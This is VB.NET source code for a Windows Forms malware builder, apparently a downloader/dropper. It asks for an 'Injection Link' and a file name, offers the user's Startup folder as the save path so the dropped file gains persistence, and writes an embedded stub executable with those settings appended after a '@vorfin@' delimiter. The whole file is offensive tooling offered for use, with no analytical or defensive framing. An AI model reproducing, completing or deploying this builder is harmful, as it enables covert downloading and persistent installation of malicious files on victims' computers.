Imports System.IO
Public Class Form1

    Dim savepath As String

    Dim stub, text1, text2, text3 As String

    Dim cb As Boolean

    Const FileSplit = "@vorfin@"

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.MaximizeBox = False
        PictureBox2.Image = My.Resources.Resources.Button2
    End Sub

    Private Sub PictureBox2_MouseEnter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.MouseEnter
        PictureBox2.Image = My.Resources.Resources.Button1
    End Sub

    Private Sub PictureBox2_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.MouseLeave
        PictureBox2.Image = My.Resources.Resources.Button2
    End Sub

    Private Sub PictureBox2_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        If Me.TextBox1.Text = "" Then
            MessageBox.Show("Please Enter Your Injection Link", "Enter Injection Link.", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub

        ElseIf Me.TextBox2.Text = "" Then
            MessageBox.Show("Please Enter The Name Of Your File.", "Enter File name.", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If


        If Me.RadioButton1.Checked = True Then
            savepath = "c:\"
        End If

        If Me.RadioButton2.Checked = True Then
            savepath = "C:\Documents and Settings\" & System.Environment.UserName & "\Start Menu\Programs\startup\"
        End If



        text1 = TextBox1.Text
        text2 = TextBox2.Text
        text3 = savepath

        Dim b As Byte() = My.Resources.stub
        Dim TheFIlePath As String = Application.StartupPath & "\Stub.exe"
        Dim TempFile As System.IO.FileStream = IO.File.Create(TheFIlePath)
        TempFile.Write(b, 0, b.Length)
        TempFile.Close()

        FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)

        If File.Exists(TextBox3.Text) Then
            My.Computer.FileSystem.DeleteFile(TextBox3.Text)
        End If

        FileOpen(1, Application.StartupPath & "\" & TextBox3.Text, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2 & FileSplit & savepath)

        System.IO.File.Delete(Application.StartupPath & ("\Stub.exe"))

        FileClose(1)

        MsgBox(TextBox3.Text & " was created successfully.")

    End Sub

End Class
